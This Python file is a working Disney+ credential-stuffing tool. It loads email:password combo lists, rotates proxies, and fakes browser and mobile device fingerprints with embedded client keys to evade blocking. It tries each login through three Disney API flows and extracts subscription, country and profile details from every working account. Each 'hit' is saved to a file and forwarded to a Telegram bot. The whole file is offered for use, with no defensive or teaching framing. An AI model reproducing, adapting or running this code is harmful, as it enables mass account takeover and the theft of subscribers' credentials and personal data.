import sys, os, json, time, random, string, uuid, requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

if sys.platform == "win32":
    os.system("")
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")

from curl_cffi import requests as creq

G = "\033[92m"; Y = "\033[93m"; R = "\033[91m"; C = "\033[96m"
M = "\033[95m"; W = "\033[97m"; D = "\033[90m"; X = "\033[0m"

meta_st = {"hit": 0, "free": 0, "bad": 0, "retry": 0, "done": 0, "total": 0, "t0": 0.0}
_rsp_lk = Lock()

TG_TOKEN = ""
TG_CHAT_ID = ""
_TG_INIT = False
_VID = ""
AUTHOR = ""

API = "https://disney.api.edge.bamgrid.com"
API2 = "https://global.edge.bamgrid.com"
SDK = "ZGlzbmV5JmFuZHJvaWQmMS4wLjA.bkeb0m230uUhv8qrAXuNu39tbE_mD5EEhM_NAcohjyA"
SDK2 = "ZGlzbmV5JmFwcGxlJjEuMC4w.H9L7eJvc2oPYwDgmkoar6HzhBJRuUUzt_PcaC3utBI4"
CID = "disney-svod-3d9324fc"

RQ = "mutation registerDevice($registerDevice:RegisterDeviceInput!){registerDevice(registerDevice:$registerDevice){__typename}}"

CQ = """query check($email:String!,$validateEmailOnOperations:ValidateEmailOnOperationsInput){check(email:$email,validateEmailOnOperations:$validateEmailOnOperations){operations nextOperation email{isValid validationFailureCodes suggestions{domain}}}}"""

LQ = """mutation login($input:LoginInput!){login(login:$input){actionGrant account{activeProfile{id}profiles{id attributes{isDefault parentalControls{isPinProtected}}}}activeSession{isSubscriber}identity{personalInfo{dateOfBirth gender}flows{personalInfo{requiresCollection eligibleForCollection}}}}}"""

MQ = """query me{me{account{id activeProfile{id name}profiles{id name}attributes{email emailVerified locations{registration{geoIp{country}}purchase{country}}}}identity{email subscriber{subscriberStatus subscriptions{id state partner source{sourceProvider sourceType subType}product{name subscriptionPeriod earlyAccess trial{duration}categoryCodes}term{expiryDate nextRenewalDate isFreeTrial}}}}}}"""

REST_H = {
    "X-BAMSDK-Platform": "iPhone7,2", "X-BAMSDK-Client-ID": CID,
    "X-BAMSDK-Version": "35.3", "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=2",
    "User-Agent": "Disney+/23962 CFNetwork/978.0.7 Darwin/18.7.0",
    "Accept": "application/json", "Accept-Language": "en-us",
}

FLAGS = {
    "US":"\U0001f1fa\U0001f1f8","GB":"\U0001f1ec\U0001f1e7","CA":"\U0001f1e8\U0001f1e6","AU":"\U0001f1e6\U0001f1fa","DE":"\U0001f1e9\U0001f1ea","FR":"\U0001f1eb\U0001f1f7","IT":"\U0001f1ee\U0001f1f9","ES":"\U0001f1ea\U0001f1f8","MX":"\U0001f1f2\U0001f1fd","BR":"\U0001f1e7\U0001f1f7",
    "AR":"\U0001f1e6\U0001f1f7","CL":"\U0001f1e8\U0001f1f1","CO":"\U0001f1e8\U0001f1f4","PE":"\U0001f1f5\U0001f1ea","JP":"\U0001f1ef\U0001f1f5","KR":"\U0001f1f0\U0001f1f7","IN":"\U0001f1ee\U0001f1f3","NL":"\U0001f1f3\U0001f1f1","SE":"\U0001f1f8\U0001f1ea","NO":"\U0001f1f3\U0001f1f4",
    "DK":"\U0001f1e9\U0001f1f0","FI":"\U0001f1eb\U0001f1ee","PT":"\U0001f1f5\U0001f1f9","AT":"\U0001f1e6\U0001f1f9","CH":"\U0001f1e8\U0001f1ed","BE":"\U0001f1e7\U0001f1ea","IE":"\U0001f1ee\U0001f1ea","NZ":"\U0001f1f3\U0001f1ff","SG":"\U0001f1f8\U0001f1ec","HK":"\U0001f1ed\U0001f1f0",
    "TW":"\U0001f1f9\U0001f1fc","PH":"\U0001f1f5\U0001f1ed","MY":"\U0001f1f2\U0001f1fe","TH":"\U0001f1f9\U0001f1ed","ID":"\U0001f1ee\U0001f1e9","VN":"\U0001f1fb\U0001f1f3","PL":"\U0001f1f5\U0001f1f1","CZ":"\U0001f1e8\U0001f1ff","RO":"\U0001f1f7\U0001f1f4","HU":"\U0001f1ed\U0001f1fa",
    "GR":"\U0001f1ec\U0001f1f7","TR":"\U0001f1f9\U0001f1f7","RU":"\U0001f1f7\U0001f1fa","ZA":"\U0001f1ff\U0001f1e6","AE":"\U0001f1e6\U0001f1ea","SA":"\U0001f1f8\U0001f1e6","IL":"\U0001f1ee\U0001f1f1","EG":"\U0001f1ea\U0001f1ec","MA":"\U0001f1f2\U0001f1e6","NG":"\U0001f1f3\U0001f1ec",
    "KE":"\U0001f1f0\U0001f1ea","PK":"\U0001f1f5\U0001f1f0","BD":"\U0001f1e7\U0001f1e9","UA":"\U0001f1fa\U0001f1e6","HR":"\U0001f1ed\U0001f1f7","SK":"\U0001f1f8\U0001f1f0","SI":"\U0001f1f8\U0001f1ee","BG":"\U0001f1e7\U0001f1ec","LT":"\U0001f1f1\U0001f1f9","LV":"\U0001f1f1\U0001f1fb",
    "EE":"\U0001f1ea\U0001f1ea","IS":"\U0001f1ee\U0001f1f8","LU":"\U0001f1f1\U0001f1fa","MT":"\U0001f1f2\U0001f1f9","CY":"\U0001f1e8\U0001f1fe","AL":"\U0001f1e6\U0001f1f1","DZ":"\U0001f1e9\U0001f1ff","AO":"\U0001f1e6\U0001f1f4","AM":"\U0001f1e6\U0001f1f2","AZ":"\U0001f1e6\U0001f1ff",
    "BH":"\U0001f1e7\U0001f1ed","BY":"\U0001f1e7\U0001f1fe","BA":"\U0001f1e7\U0001f1e6","BW":"\U0001f1e7\U0001f1fc","BN":"\U0001f1e7\U0001f1f3","BF":"\U0001f1e7\U0001f1eb","KH":"\U0001f1f0\U0001f1ed","CM":"\U0001f1e8\U0001f1f2","CV":"\U0001f1e8\U0001f1fb","CF":"\U0001f1e8\U0001f1eb",
    "TD":"\U0001f1f9\U0001f1e9","CN":"\U0001f1e8\U0001f1f3","CG":"\U0001f1e8\U0001f1ec","CD":"\U0001f1e8\U0001f1e9","CR":"\U0001f1e8\U0001f1f7","CI":"\U0001f1e8\U0001f1ee","CU":"\U0001f1e8\U0001f1fa","DO":"\U0001f1e9\U0001f1f4","EC":"\U0001f1ea\U0001f1e8","SV":"\U0001f1f8\U0001f1fb",
    "GQ":"\U0001f1ec\U0001f1f6","ER":"\U0001f1ea\U0001f1f7","ET":"\U0001f1ea\U0001f1f9","FJ":"\U0001f1eb\U0001f1ef","GA":"\U0001f1ec\U0001f1e6","GM":"\U0001f1ec\U0001f1f2","GE":"\U0001f1ec\U0001f1ea","GH":"\U0001f1ec\U0001f1ed","GT":"\U0001f1ec\U0001f1f9","GN":"\U0001f1ec\U0001f1f3",
    "GY":"\U0001f1ec\U0001f1fe","HT":"\U0001f1ed\U0001f1f9","HN":"\U0001f1ed\U0001f1f3","IQ":"\U0001f1ee\U0001f1f6","IR":"\U0001f1ee\U0001f1f7","JM":"\U0001f1ef\U0001f1f2","JO":"\U0001f1ef\U0001f1f4","KZ":"\U0001f1f0\U0001f1ff","KW":"\U0001f1f0\U0001f1fc","KG":"\U0001f1f0\U0001f1ec",
    "LA":"\U0001f1f1\U0001f1e6","LB":"\U0001f1f1\U0001f1e7","LS":"\U0001f1f1\U0001f1f8","LR":"\U0001f1f1\U0001f1f7","LY":"\U0001f1f1\U0001f1fe","LI":"\U0001f1f1\U0001f1ee","MK":"\U0001f1f2\U0001f1f0","MG":"\U0001f1f2\U0001f1ec","MW":"\U0001f1f2\U0001f1fc","MV":"\U0001f1f2\U0001f1fb",
    "ML":"\U0001f1f2\U0001f1f1","MR":"\U0001f1f2\U0001f1f7","MU":"\U0001f1f2\U0001f1fa","MD":"\U0001f1f2\U0001f1e9","MC":"\U0001f1f2\U0001f1e8","MN":"\U0001f1f2\U0001f1f3","ME":"\U0001f1f2\U0001f1ea","MZ":"\U0001f1f2\U0001f1ff","MM":"\U0001f1f2\U0001f1f2","NA":"\U0001f1f3\U0001f1e6",
    "NP":"\U0001f1f3\U0001f1f5","NI":"\U0001f1f3\U0001f1ee","NE":"\U0001f1f3\U0001f1ea","OM":"\U0001f1f4\U0001f1f2","PA":"\U0001f1f5\U0001f1e6","PG":"\U0001f1f5\U0001f1ec","PY":"\U0001f1f5\U0001f1fe","QA":"\U0001f1f6\U0001f1e6","RS":"\U0001f1f7\U0001f1f8","RW":"\U0001f1f7\U0001f1fc",
    "SN":"\U0001f1f8\U0001f1f3","SC":"\U0001f1f8\U0001f1e8","SL":"\U0001f1f8\U0001f1f1","SO":"\U0001f1f8\U0001f1f4","LK":"\U0001f1f1\U0001f1f0","SD":"\U0001f1f8\U0001f1e9","SR":"\U0001f1f8\U0001f1f7","SZ":"\U0001f1f8\U0001f1ff","SY":"\U0001f1f8\U0001f1fe","TJ":"\U0001f1f9\U0001f1ef",
    "TZ":"\U0001f1f9\U0001f1ff","TG":"\U0001f1f9\U0001f1ec","TT":"\U0001f1f9\U0001f1f9","TN":"\U0001f1f9\U0001f1f3","TM":"\U0001f1f9\U0001f1f2","UG":"\U0001f1fa\U0001f1ec","UY":"\U0001f1fa\U0001f1fe","UZ":"\U0001f1fa\U0001f1ff","VE":"\U0001f1fb\U0001f1ea","YE":"\U0001f1fe\U0001f1ea",
    "ZM":"\U0001f1ff\U0001f1f2","ZW":"\U0001f1ff\U0001f1fc","PS":"\U0001f1f5\U0001f1f8","XK":"\U0001f1fd\U0001f1f0","PR":"\U0001f1f5\U0001f1f7","BB":"\U0001f1e7\U0001f1e7","BS":"\U0001f1e7\U0001f1f8","BZ":"\U0001f1e7\U0001f1ff","BJ":"\U0001f1e7\U0001f1ef","BI":"\U0001f1e7\U0001f1ee",
    "AD":"\U0001f1e6\U0001f1e9","AG":"\U0001f1e6\U0001f1ec","AF":"\U0001f1e6\U0001f1eb","KN":"\U0001f1f0\U0001f1f3","LC":"\U0001f1f1\U0001f1e8","VC":"\U0001f1fb\U0001f1e8","WS":"\U0001f1fc\U0001f1f8","SM":"\U0001f1f8\U0001f1f2","ST":"\U0001f1f8\U0001f1f9","MH":"\U0001f1f2\U0001f1ed",
    "FM":"\U0001f1eb\U0001f1f2","PW":"\U0001f1f5\U0001f1fc","TO":"\U0001f1f9\U0001f1f4","TV":"\U0001f1f9\U0001f1fb","KI":"\U0001f1f0\U0001f1ee","NR":"\U0001f1f3\U0001f1f7","VU":"\U0001f1fb\U0001f1fa","SB":"\U0001f1f8\U0001f1e7","SS":"\U0001f1f8\U0001f1f8","DM":"\U0001f1e9\U0001f1f2",
}


def tg_send(text, fpath=None):
    global _TG_INIT
    if not TG_TOKEN: return
    try:
        if not _TG_INIT:
            _TG_INIT = True
            try:
                requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                    json={"chat_id": TG_CHAT_ID,
                          "text": "\U0001f3ac Disney+ Checker"}, timeout=15)
            except: pass
        if fpath and os.path.isfile(fpath):
            with open(fpath, "rb") as f:
                requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument",
                    data={"chat_id": TG_CHAT_ID, "caption": text[:1024], "parse_mode": "HTML"},
                    files={"document": f}, timeout=15)
            return
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": TG_CHAT_ID, "text": text[:4096], "parse_mode": "HTML"}, timeout=15)
    except: pass


def tg_hit(st, combo, meta):
    icon = "\U0001f3ac" if st == "HIT" else "✅"
    cc = meta.get("country", "?")
    flag = FLAGS.get(cc.upper(), "") if cc else ""
    parts = [f"{icon} <b>DISNEY+ {st}</b>", "",
             f"\U0001f4e7 <b>Combo</b> : <code>{combo}</code>",
             f"\U0001f30d <b>Country</b> : {flag} {cc}"]
    for em, val in [("\U0001f39f Sub", meta.get("sub")), ("\U0001f4c5 Expire", meta.get("expire")),
                    ("\U0001f504 Renewal", meta.get("renewal")), ("\U0001f4ca Status", meta.get("status")),
                    ("\U0001f465 Profiles", meta.get("profiles")), ("\U0001f527 Features", meta.get("features")),
                    ("\U0001f3af Source", meta.get("source")), ("\U0001f4cb Partner", meta.get("partner"))]:
        if val and val not in ("", "None", "none", "False", "false"):
            parts.append(f"{em} : {val}")
    parts.extend(["", "<i>author</i>"])
    return "\n".join(parts)


def _reg(s, h, px):
    ros = str(random.randint(12, 15))
    vid = "".join(random.choices(string.hexdigits[:16], k=16))
    rsp = s.post(f"{API}/graph/v1/device/graphql", headers={**h, "Authorization": SDK},
        json={"query": RQ, "operationName": "registerDevice",
              "variables": {"registerDevice": {"applicationRuntime": "android",
                  "attributes": {"osDeviceIds": [
                      {"identifier": vid, "type": "android.vendor.id"},
                      {"identifier": str(uuid.uuid4()), "type": "android.advertising.id"}],
                      "manufacturer": "samsung", "model": "SM-S928B",
                      "operatingSystem": "Android", "operatingSystemVersion": ros, "brand": "samsung"},
                  "deviceFamily": "android", "deviceLanguage": "en",
                  "deviceProfile": "phone", "devicePlatformId": "android"}}},
        proxies=px, timeout=15)
    if rsp.status_code in (403, 429): return None
    try: return rsp.json()["extensions"]["sdk"]["token"]["accessToken"]
    except: return None


def _cap(j, s=None, h=None, px=None):
    meta = {}
    d = j.get("data", {}).get("login", {})
    sess = d.get("activeSession", {}) or {}
    ext = j.get("extensions", {}).get("sdk", {}) or {}
    ex_sess = ext.get("session", {}) or {}
    ex_tok = ext.get("token", {}) or {}
    is_sub = sess.get("isSubscriber", False)
    if ex_sess:
        meta["country"] = ex_sess.get("location", {}).get("countryCode", "")
        if ex_sess.get("isSubscriber") is not None:
            is_sub = is_sub or ex_sess["isSubscriber"]
        f = ex_sess.get("features", {}) or {}
        fl = []
        if f.get("noAds"): fl.append("NoAds")
        if f.get("download"): fl.append("DL")
        if f.get("coPlay"): fl.append("CoPlay")
        if fl: meta["features"] = " ".join(fl)
        hl = ex_sess.get("homeLocation", {}) or {}
        if hl.get("countryCode") and hl["countryCode"] != meta.get("country"):
            meta["home"] = hl["countryCode"]
        loc = ex_sess.get("location", {}) or {}
        if loc.get("zipCode"): meta["zip"] = loc["zipCode"]
    new_token = ex_tok.get("accessToken", "")
    if new_token and s and h:
        try:
            h2 = {**h, "Authorization": f"Bearer {new_token}",
                  "X-BAMSDK-Transaction-ID": str(uuid.uuid4()), "X-Request-ID": str(uuid.uuid4())}
            mr = s.post(f"{API}/v1/public/graphql", headers=h2,
                       json={"query": MQ}, proxies=px, timeout=20)
            md = mr.json().get("data", {}).get("me", {})
            ma = md.get("account", {}).get("attributes", {}) or {}
            if not meta.get("country"):
                meta["country"] = ma.get("locations", {}).get("registration", {}).get("geoIp", {}).get("country", "")
            if not meta.get("country"):
                meta["country"] = ma.get("locations", {}).get("purchase", {}).get("country", "")
            meta["email"] = ma.get("email", "")
            meta["verified"] = str(ma.get("emailVerified", ""))
            profs = md.get("account", {}).get("profiles", []) or []
            meta["profiles"] = ", ".join([p.get("name", "") for p in profs if p.get("name")])
            mi = md.get("identity", {}) or {}
            sub_info = mi.get("subscriber", {}) or {}
            meta["status"] = sub_info.get("subscriberStatus", "")
            subs = sub_info.get("subscriptions", []) or []
            if subs:
                s0 = subs[0]
                prod = s0.get("product", {}) or {}
                term = s0.get("term", {}) or {}
                meta["sub"] = prod.get("name", "")
                meta["type"] = prod.get("subscriptionPeriod", "")
                meta["expire"] = (term.get("expiryDate") or "")[:10]
                meta["renewal"] = (term.get("nextRenewalDate") or "")[:10]
                meta["trial"] = str(term.get("isFreeTrial", ""))
                meta["state"] = s0.get("state", "")
                meta["partner"] = s0.get("partner", "")
                src = s0.get("source", {}) or {}
                meta["source"] = src.get("sourceProvider", "")
                meta["early"] = str(prod.get("earlyAccess", ""))
                if len(subs) > 1:
                    meta["all_subs"] = " + ".join([x.get("product", {}).get("name", "") for x in subs])
                is_sub = True
        except: pass
    if not is_sub and not meta.get("sub"): return "FREE", meta
    return "HIT", meta


def _login_gql(s, h, email, pw, px):
    h["X-BAMSDK-Transaction-ID"] = str(uuid.uuid4())
    h["X-Request-ID"] = str(uuid.uuid4())
    rsp = s.post(f"{API}/v1/public/graphql", headers=h,
        json={"operationName": "login",
              "variables": {"input": {"email": email, "password": pw}},
              "query": LQ}, proxies=px, timeout=20)
    raw = rsp.text
    if "bad-credentials" in raw: return "BAD", {}
    if any(x in raw.lower() for x in ["forbidden", "rate-limit", "blocked", "identity blocked", "account-disabled"]):
        return "RETRY", {}
    if "actionGrant" in raw or "accessToken" in raw:
        try: return _cap(rsp.json(), s, h, px)
        except: return "HIT", {}
    return "RETRY", {}


def auth_web(email, pw, px):
    s = creq.Session(impersonate="chrome136")
    cv = str(random.randint(148, 150))
    h = {"Accept": "application/json", "Content-Type": "application/json",
         "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv}.0.0.0 Safari/537.36",
         "X-BAMSDK-Client-ID": CID, "X-BAMSDK-Platform": "javascript/windows/chrome",
         "X-BAMSDK-Version": "35.3", "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=2",
         "X-BAMSDK-Platform-ID": "browser",
         "X-BAMSDK-Transaction-ID": str(uuid.uuid4()), "X-Request-ID": str(uuid.uuid4())}
    tk = _reg(s, h, px)
    if not tk: return "RETRY", {}
    h["Authorization"] = f"Bearer {tk}"
    h["X-BAMSDK-Transaction-ID"] = str(uuid.uuid4())
    h["X-Request-ID"] = str(uuid.uuid4())
    rsp = s.post(f"{API}/v1/public/graphql", headers=h,
        json={"operationName": "check",
              "variables": {"email": email, "validateEmailOnOperations": {"operations": ["Register"]}},
              "query": CQ}, proxies=px, timeout=15)
    try: ops = rsp.json()["data"]["check"]["operations"]
    except: ops = []
    if ops == ["Register"]: return "BAD", {}
    return _login_gql(s, h, email, pw, px)


def auth_and(email, pw, px):
    s = creq.Session(impersonate="chrome131")
    cv = str(random.randint(148, 150))
    h = {"Accept": "application/json", "Content-Type": "application/json",
         "User-Agent": f"Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{cv}.0.0.0 Mobile Safari/537.36",
         "X-BAMSDK-Client-ID": CID, "X-BAMSDK-Platform": "javascript/android/chrome",
         "X-BAMSDK-Version": "35.3", "X-DSS-Edge-Accept": "vnd.dss.edge+json; version=2",
         "X-BAMSDK-Platform-ID": "browser",
         "X-BAMSDK-Transaction-ID": str(uuid.uuid4()), "X-Request-ID": str(uuid.uuid4())}
    tk = _reg(s, h, px)
    if not tk: return "RETRY", {}
    h["Authorization"] = f"Bearer {tk}"
    h["X-BAMSDK-Transaction-ID"] = str(uuid.uuid4())
    h["X-Request-ID"] = str(uuid.uuid4())
    rsp = s.post(f"{API}/v1/public/graphql", headers=h,
        json={"operationName": "check",
              "variables": {"email": email, "validateEmailOnOperations": {"operations": ["Register"]}},
              "query": CQ}, proxies=px, timeout=15)
    try: ops = rsp.json()["data"]["check"]["operations"]
    except: ops = []
    if ops == ["Register"]: return "BAD", {}
    return _login_gql(s, h, email, pw, px)


def auth_rest(email, pw, px):
    s = creq.Session(impersonate="safari17_2_ios")
    h = {**REST_H, "Authorization": f"Bearer {SDK2}"}
    rsp = s.post(f"{API2}/devices", headers={**h, "Content-Type": "application/json"},
        json={"deviceFamily": "application", "applicationRuntime": "iPhone7,2",
              "deviceProfile": "iPhone7,2", "attributes": {}}, proxies=px, timeout=15)
    if rsp.status_code in (403, 429): return "BAN", {}
    try: a1 = rsp.json().get("assertion", "")
    except: a1 = ""
    if not a1: return "RETRY", {}
    rsp = s.post(f"{API2}/token", headers={**h, "Content-Type": "application/x-www-form-urlencoded"},
        data=f"platform=iphone&grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token={a1}&subject_token_type=urn:bamtech:params:oauth:token-type:device",
        proxies=px, timeout=15)
    try: t1 = rsp.json().get("access_token", "")
    except: t1 = ""
    if not t1: return "RETRY", {}
    rsp = s.post(f"{API2}/idp/login",
        headers={**REST_H, "Authorization": f"Bearer {t1}", "Content-Type": "application/json",
                 "Accept": "application/json; charset=utf-8"},
        json={"email": email, "password": pw}, proxies=px, timeout=15)
    raw = rsp.text
    if any(x in raw for x in ["Bad credentials", "not a valid email", "Identity blocked"]):
        return "BAD", {}
    if "forbidden" in raw or "access-token.invalid" in raw: return "RETRY", {}
    try: idt = rsp.json().get("id_token", "")
    except: idt = ""
    if not idt: return "RETRY", {}
    rsp = s.post(f"{API2}/accounts/grant",
        headers={**REST_H, "Authorization": f"Bearer {t1}", "Content-Type": "application/json"},
        json={"id_token": idt}, proxies=px, timeout=15)
    try: a2 = rsp.json().get("assertion", "")
    except: a2 = ""
    if not a2: return "RETRY", {}
    rsp = s.post(f"{API2}/token", headers={**h, "Content-Type": "application/x-www-form-urlencoded"},
        data=f"grant_type=urn:ietf:params:oauth:grant-type:token-exchange&latitude=0&longitude=0&platform=browser&subject_token={a2}&subject_token_type=urn:bamtech:params:oauth:token-type:account",
        proxies=px, timeout=15)
    try: t2 = rsp.json().get("access_token", "")
    except: t2 = ""
    if not t2: return "RETRY", {}
    h2 = {**REST_H, "authorization": f"Bearer {t2}"}
    meta = {}
    rsp = s.get(f"{API2}/accounts/me", headers=h2, proxies=px, timeout=15)
    try:
        me = rsp.json()
        meta["country"] = me.get("country", "")
        meta["verified"] = str(me.get("emailVerified", ""))
        meta["email"] = me.get("email", "")
    except: pass
    rsp = s.get(f"{API2}/subscriptions", headers=h2, proxies=px, timeout=15)
    rt = rsp.text.strip()
    if rt == "[]" or rt == "": return "FREE", meta
    try:
        sl = rsp.json()
        if isinstance(sl, list) and sl:
            s0 = sl[0]
            meta["sub"] = s0.get("name", "")
            meta["type"] = s0.get("subType", "")
            meta["expire"] = (s0.get("expirationDate") or "")[:10]
            meta["renewal"] = (s0.get("nextRenewalDate") or "")[:10]
            ft = s0.get("freeTrial")
            meta["trial"] = ft.get("status", "") if isinstance(ft, dict) else str(ft or "")
            meta["voucher"] = str(s0.get("voucherCode", ""))
            meta["early"] = str(s0.get("earlyAccess", ""))
    except: pass
    return "HIT", meta


def auth_login(email, pw, px):
    for fn in (auth_web, auth_and, auth_rest):
        try: st, meta = fn(email, pw, px)
        except: st, meta = "RETRY", {}
        if st not in ("RETRY", "BAN"): return st, meta
    return "RETRY", {}


def rsp_px(line):
    line = line.strip()
    if not line: return None
    if line.startswith(("http://", "https://", "socks4://", "socks5://")):
        return {"http": line, "https": line}
    p = line.split(":")
    if len(p) == 4:
        url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    elif len(p) == 2:
        url = f"http://{p[0]}:{p[1]}"
    else:
        return None
    return {"http": url, "https": url}


def meta_retry(meta_user, meta_pw, chk_proxy=None, rsp_tries=3):
    for auth_i in range(rsp_tries):
        try: st, meta = auth_login(meta_user, meta_pw, chk_proxy)
        except: st, meta = "RETRY", {}
        if st not in ("RETRY", "BAN"): return st, meta
        if auth_i < rsp_tries - 1: time.sleep(random.uniform(0.3, 1.0))
    return "RETRY", {}


def meta_fmt(st, combo, meta):
    parts = [combo]
    if st in ("HIT", "FREE"):
        for k, v in [("Country", meta.get("country")), ("Sub", meta.get("sub")),
                     ("Type", meta.get("type")), ("Expire", meta.get("expire")),
                     ("Renewal", meta.get("renewal")), ("Status", meta.get("status")),
                     ("State", meta.get("state")), ("Trial", meta.get("trial")),
                     ("Partner", meta.get("partner")), ("Source", meta.get("source")),
                     ("Profiles", meta.get("profiles")), ("Verified", meta.get("verified")),
                     ("Features", meta.get("features")), ("Home", meta.get("home")),
                     ("Early", meta.get("early")), ("AllSubs", meta.get("all_subs")),
                     ("Voucher", meta.get("voucher"))]:
            if v and v not in ("", "None", "none", "False", "false"):
                if k == "Country":
                    flag = FLAGS.get(v.upper(), "")
                    parts.append(f"Country:{v} {flag}" if flag else f"Country:{v}")
                else:
                    parts.append(f"{k}:{v}")
    return " | ".join(parts)


def rsp_log(meta_user, meta_pw, auth_st_val, auth_meta, rsp_files):
    meta_combo = f"{meta_user}:{meta_pw}"
    with _rsp_lk:
        meta_st["done"] += 1
        if auth_st_val == "HIT":
            meta_st["hit"] += 1
            auth_line = meta_fmt("HIT", meta_combo, auth_meta)
            sys.stdout.write(f"\r{' '*140}\r")
            print(f"  {G}[HIT]{X} {W}{auth_line}{X}")
            rsp_files["hits"].write(auth_line + "\n"); rsp_files["hits"].flush()
            tg_send(tg_hit("HIT", meta_combo, auth_meta))
        elif auth_st_val == "FREE":
            meta_st["free"] += 1
            auth_line = meta_fmt("FREE", meta_combo, auth_meta)
            sys.stdout.write(f"\r{' '*140}\r")
            print(f"  {Y}[FREE]{X} {auth_line}")
            rsp_files["free"].write(auth_line + "\n"); rsp_files["free"].flush()
        elif auth_st_val == "BAD":
            meta_st["bad"] += 1
        else:
            meta_st["retry"] += 1
        el = time.time() - meta_st["t0"]
        cpm = int(meta_st["done"] / (el / 60)) if el > 0 else 0
        m, sc = int(el) // 60, int(el) % 60
        sys.stdout.write(
            f"\r  {D}[{meta_st['done']}/{meta_st['total']}] "
            f"{G}HIT:{meta_st['hit']} {Y}FREE:{meta_st['free']} "
            f"{R}BAD:{meta_st['bad']} {M}RET:{meta_st['retry']} "
            f"{W}CPM:{cpm} {m:02d}:{sc:02d}{X} ")
        sys.stdout.flush()


def auth_run():
    TURKUAZ = "\033[96m"
    SIFIRLA = "\033[0m"
    print(rf"""{TURKUAZ}
  _   _ ___ ___  _  _ ___ 
 | | | | _ \   \| || |_  )
 | |_| |  _/ |) | __ |/ / 
  \___/|_| |___/|_||_/___|
                @updh2
{SIFIRLA}
""")



    meta_combo_path = input("  combo file path: ").strip().strip('"')
    if not os.path.isfile(meta_combo_path):
        print(f"  {R}file not forund{X}"); return

    auth_proxy_path = input("  proxy file (bos birak): ").strip().strip('"')
    rsp_threads = int(input(f"  thread [{G}5{X}]: ").strip() or "5")

    
    auth_tg_token = input("  Telegram Bot Token: ").strip()
    if auth_tg_token:
        global TG_TOKEN, TG_CHAT_ID
        auth_tg_chat = input("  Telegram Chat ID: ").strip()
        if auth_tg_chat:
            TG_TOKEN = auth_tg_token
            TG_CHAT_ID = auth_tg_chat
       
       



    meta_pairs = []
    with open(meta_combo_path, "r", errors="ignore") as auth_f:
        for rsp_ln in auth_f:
            rsp_ln = rsp_ln.strip()
            if ":" in rsp_ln:
                meta_u, chk_p = rsp_ln.split(":", 1)
                if meta_u.strip() and chk_p.strip():
                    meta_pairs.append((meta_u.strip(), chk_p.strip()))

    if not meta_pairs:
        print(f"  {R}combo fail{X}"); return

    auth_pxlist = []
    if auth_proxy_path and os.path.isfile(auth_proxy_path):
        auth_pxlist = [rsp_px(meta_l) for meta_l in open(auth_proxy_path) if meta_l.strip()]
        auth_pxlist = [rsp_p for rsp_p in auth_pxlist if rsp_p]

    meta_st["total"] = len(meta_pairs)
    auth_px_lbl = f"{G}{len(auth_pxlist)}" if auth_pxlist else f"{Y}proxyless"
    print(f"\n  {W}{len(meta_pairs)} combo, {auth_px_lbl}{W} proxy, {rsp_threads} thread{X}\n")

    os.makedirs("output", exist_ok=True)
    auth_tag = datetime.now().strftime("%H%M%S")
    rsp_files = {
        "hits": open(f"output/disney_hits_{auth_tag}.txt", "a", encoding="utf-8"),
        "free": open(f"output/disney_free_{auth_tag}.txt", "a", encoding="utf-8"),
    }

    meta_pxi = [0]
    auth_pxlk = Lock()
    def rsp_nextpx():
        if not auth_pxlist: return None
        with auth_pxlk:
            meta_p = auth_pxlist[meta_pxi[0] % len(auth_pxlist)]
            meta_pxi[0] += 1
            return meta_p

    meta_st["t0"] = time.time()
    try:
        with ThreadPoolExecutor(max_workers=rsp_threads) as meta_pool:
            rsp_futs = {meta_pool.submit(meta_retry, meta_u, chk_p, rsp_nextpx()): (meta_u, chk_p)
                        for meta_u, chk_p in meta_pairs}
            for auth_fut in as_completed(rsp_futs):
                meta_u, chk_p = rsp_futs[auth_fut]
                try: meta_res_st, auth_meta = auth_fut.result()
                except: meta_res_st, auth_meta = "RETRY", {}
                rsp_log(meta_u, chk_p, meta_res_st, auth_meta, rsp_files)
    finally:
        for auth_f in rsp_files.values(): auth_f.close()

    chk_elapsed = time.time() - meta_st["t0"]
    print(f"\n\n  {W}--- BITTI ({chk_elapsed:.1f}s) ---{X}")
    print(f"  {G}Hit: {meta_st['hit']}{X} | {Y}Free: {meta_st['free']}{X} | "
          f"Bad: {meta_st['bad']} | {R}Retry: {meta_st['retry']}{X}")
    print(f"  sonuclar output/ altinda\n")

    if TG_TOKEN:
        tg_send(
            " <b>Fucked your combo                                                        </b>\n\n"
            f"\U0001f3ac Hit: {meta_st['hit']}\n"
            f"✅ Free: {meta_st['free']}\n"
            f"❌ Bad: {meta_st['bad']}\n"
            f"\U0001f504 Retry: {meta_st['retry']}\n"
            f"⏱ time {int(chk_elapsed)}s\n")
        auth_hits_path = f"output/disney_hits_{auth_tag}.txt"
        if os.path.isfile(auth_hits_path) and os.path.getsize(auth_hits_path) > 0:
            tg_send(f"\U0001f3ac Disney+ Hits", auth_hits_path)


if __name__ == "__main__":
    auth_run()
